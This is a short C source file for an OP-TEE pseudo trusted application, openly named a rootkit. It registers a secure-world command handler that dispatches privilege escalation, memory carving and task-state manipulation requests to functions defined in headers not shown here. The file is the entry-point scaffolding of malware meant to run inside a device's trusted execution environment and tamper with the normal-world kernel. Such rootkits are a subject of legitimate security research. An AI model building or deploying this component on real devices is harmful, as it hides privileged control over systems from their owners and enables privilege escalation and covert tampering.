#include <kernel/pseudo_ta.h>
#include <inttypes.h>

#include "rootkit_pta.h"

#include "commands/memory_carving.h"
#include "commands/privilege_escalation.h"
#include "commands/task_state_manipulation.h"


static TEE_Result invoke_command(void *psess __unused,
                                 uint32_t cmd, uint32_t ptypes,
                                 TEE_Param params[TEE_NUM_PARAMS])
{
    TEE_Result result;
    switch (cmd) {
        case ELEVATE_PRIVILEGES:
            IMSG("ELEVATE_PRIVILEGES: before\n");
            result = elevate_privileges(ptypes, params);
            IMSG("ELEVATE_PRIVILEGES: after\n");
            break;
        case MEMORY_CARVING:
            IMSG("MEMORY_CARVING: before\n");
            result = memory_carving(ptypes, params);
            IMSG("MEMORY_CARVING: after\n");
            break;
        case CHANGE_TASK_STATE:
            IMSG("CHANGE_TASK_STATE: before\n");
            result = change_task_state(ptypes, params);
            IMSG("CHANGE_TASK_STATE: after\n");
            break;
        default:
            result = TEE_ERROR_BAD_PARAMETERS;
    }
    return result;
}


pseudo_ta_register(.uuid = ROOTKIT_TA_UUID, .name = TA_NAME,
                   .flags = PTA_DEFAULT_FLAGS,
                   .invoke_command_entry_point = invoke_command);
